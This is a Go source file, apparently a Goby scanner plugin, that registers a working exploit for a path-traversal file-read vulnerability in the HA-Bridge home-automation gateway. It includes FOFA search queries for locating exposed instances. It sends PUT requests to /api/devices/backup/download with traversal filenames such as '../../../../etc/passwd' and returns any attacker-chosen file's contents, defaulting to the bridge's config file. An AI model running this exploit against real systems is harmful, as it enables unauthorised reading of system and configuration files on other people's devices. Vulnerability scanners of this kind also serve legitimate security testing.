package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HA-Bridge gateway application /api/devices/backup/download file reading vulnerability",
    "Description": "<p>HA Bridge is a home automation bridge that simulates a Philips Hue light system and can control other systems such as Vera, Harmony Hub, Nest, MiLight bulbs or any other system with http/https/tcp/udp interface. </p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
    "Product": "ha bridge",
    "Homepage": "https://github.com/bwssytems/ha-bridge",
    "DisclosureDate": "2022-03-31",
    "Author": "13eczou",
    "FofaQuery": "title=\"HA Bridge\" || body=\"https://github.com/bwssytems/ha-bridge/blob/master/README.md\"",
    "GobyQuery": "title=\"HA Bridge\" || body=\"https://github.com/bwssytems/ha-bridge/blob/master/README.md\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1.There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://github.com/bwssytems/ha-bridge\">https://github.com/bwssytems/ha-bridge</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "../data/habridge.config",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/api/devices/backup/download",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json;charset=utf-8"
                },
                "data_type": "text",
                "data": "{\"filename\":\"../../../../etc/passwd\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin/bash",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/api/devices/backup/download",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json;charset=utf-8"
                },
                "data_type": "text",
                "data": "{\"filename\":\"{{{filename}}}\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin/bash",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "HA-Bridge 网关应用 /api/devices/backup/download 文件读取漏洞",
            "Product": "ha bridge",
            "Description": "<p>HA Bridge是家庭自动化桥，模拟 Philips Hue 灯光系统，可以控制其他系统，例如 Vera、Harmony Hub、Nest、MiLight 灯泡或具有 http/https/tcp/udp 接口的任何其他系统。</p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/bwssytems/ha-bridge\" target=\"_blank\">https://github.com/bwssytems/ha-bridge</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "HA-Bridge gateway application /api/devices/backup/download file reading vulnerability",
            "Product": "ha bridge",
            "Description": "<p>HA Bridge is a home automation bridge that simulates a Philips Hue light system and can control other systems such as Vera, Harmony Hub, Nest, MiLight bulbs or any other system with http/https/tcp/udp interface.&nbsp;</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
            "Recommendation": "<p>1.There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://github.com/bwssytems/ha-bridge\" target=\"_blank\">https://github.com/bwssytems/ha-bridge</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-30",
    "PocId": "10832"
}`
	readFileFajak1o213 := func(hostInfo *httpclient.FixUrl, fileName string) (*httpclient.HttpResponse, error) {
		if len(fileName) < 1 {
			fileName = "../data/habridge.config"
		}
		putRequestConfig := httpclient.NewRequestConfig("PUT", "/api/devices/backup/download")
		putRequestConfig.VerifyTls = false
		putRequestConfig.FollowRedirect = false
		putRequestConfig.Data = "{\"filename\":\"" + fileName + "\"}"
		response, err := httpclient.DoHttpRequest(hostInfo, putRequestConfig)
		return response, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			response, err := readFileFajak1o213(hostInfo, "")
			if err != nil {
				return false
			}
			return strings.Contains(response.Utf8Html, "habridge.config") || strings.Contains(response.Utf8Html, "null")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := goutils.B2S(ss.Params["filename"])
			response, err := readFileFajak1o213(expResult.HostInfo, fileName)
			if err != nil {
				return expResult
			}
			if len(response.Utf8Html) > 0 && response.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = response.Utf8Html
			}
			return expResult
		},
	))
}
